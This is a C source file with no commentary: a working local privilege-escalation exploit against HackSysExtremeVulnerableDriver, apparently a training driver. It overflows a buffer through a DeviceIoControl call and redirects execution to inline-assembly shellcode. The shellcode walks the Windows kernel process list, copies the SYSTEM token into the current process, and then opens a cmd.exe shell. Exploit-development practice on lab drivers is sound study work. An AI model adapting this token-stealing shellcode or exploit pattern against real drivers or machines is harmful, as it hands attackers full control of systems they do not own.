#include <Windows.h>
#include <stdio.h>

#define KTHREAD_OFFSET		0X124
#define KPROCESS_OFFSET		0x050
#define FLINK_OFFSET		0x0b8
#define PID_OFFSET			0x0b4
#define TOKEN_OFFSET		0x0f8
#define SYSTEM_PID			0x004
#define IO_CODE				0x222027

HANDLE hDevice = NULL;

void StealTokenShellcode()
{
	__asm
	{
		pushad

		mov eax, fs:[KTHREAD_OFFSET]
		mov eax, [eax + KPROCESS_OFFSET]
		mov ecx, eax

	find_system_pid:
		mov ecx, [ecx + FLINK_OFFSET]
		sub ecx, FLINK_OFFSET
		mov edx, [ecx + PID_OFFSET]
		cmp edx, SYSTEM_PID
		jnz find_system_pid

		mov edx, [ecx + TOKEN_OFFSET]
		mov [eax + TOKEN_OFFSET], edx

		popad
		add esp, 0xc
		pop ebp
		ret 8
	}
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	DWORD length = 0;
	BOOL status = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed To Open Driver\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Driver Handle: %d\n", (DWORD)hDevice);
	
	char buffer[0x82C] = { 0 };
	*(PDWORD)(buffer + 0x824) = (DWORD)StealTokenShellcode;
	*(PDWORD)(buffer + 0x828) = 0xBAD0B0B0;
	printf("[+] Integer OverFlow\n");
	status = DeviceIoControl(hDevice, IO_CODE, buffer, -1, NULL, 0, &length, NULL);
	if (!status)
	{
		printf("[-] Failed To Send Message\n");
		printf("Error Code: %d\n", GetLastError());
		exit(1);
	}

	printf("Time To Get Shell\n");
	CreateCmd();
	CloseHandle(hDevice);
	return 0;
}